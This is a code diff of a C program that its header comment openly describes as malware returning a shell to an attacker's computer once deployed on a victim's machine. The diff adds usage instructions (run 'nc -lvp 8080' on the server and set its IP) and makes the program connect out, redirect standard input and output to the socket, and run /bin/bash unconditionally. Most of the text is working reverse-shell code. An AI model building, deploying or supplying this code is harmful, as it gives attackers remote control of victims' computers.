@@ -1,3 +1,16 @@
+/*
+ *	Name: Franklin Nunez
+ *	Email: fn7420@rit.edu
+ *
+ *	Description: Incompleted project, it returns a shell to the attacker's
+ *		     computer. It just need to be compiled and deployed to the 
+ *		     victims computer.
+ *	
+ *	HOW TO: once the malware is in the victims machine. run nc -lvp 8080
+ *		from the server. Make sure to change the ip of the server in
+ *		this file.
+ */
+
 #include <stdio.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
@@ -29,14 +42,15 @@ int main (int argc, char const *argv[]){
 		serv_addr.sin_family = AF_INET; //USING IP
 		serv_addr.sin_port = htons(PORT); //USING PORT, which is 8080
 	
-		//printf("%d", serv_addr.sin_port);
-		if(inet_pton(AF_INET, "172.16.11.149", &serv_addr.sin_addr) <=0){
+		//converting string ip, into binary, understandable by the computer
+		if(inet_pton(AF_INET, "<IP OF SERVER>", &serv_addr.sin_addr) <=0){
 		
 			printf("\nwrong address\n");
 			return -1;
 	
 		}
-
+		//contect to the hackers computer using
+		//the created socket
 		if(connect(sock, (struct sockaddr *) &serv_addr, 
 					sizeof(serv_addr)) < 0){
 			printf("\nConnection Failed \n");
@@ -44,20 +58,23 @@ int main (int argc, char const *argv[]){
 		}
 
 		//get input from user
-		fgets(message, 1024, stdin);
-		if(!strcmp(message,"stop")){
-			printf("bye!\n");
-			exit(0);
-		}
+		//fgets(message, 1024, stdin);
+		//if(!strcmp(message,"stop")){
+		//	printf("bye!\n");
+		//	exit(0);
+		//}
 
-		else if(strcmp(message,"shell")){
-			printf("GOT HERE\n");
+		//else if(strcmp(message,"shell")){
+
 			for (int i=0; i<3; i++){
 				dup2(sock, i);
 			}
-		
+			
+			//executing the shell
 			execve("/bin/bash", NULL, NULL);
-		}
+			//fprintf(stdout, "%s", "Hello world\n");
+			//printf("Hello World\n");
+		//}
 
 
 		//else{
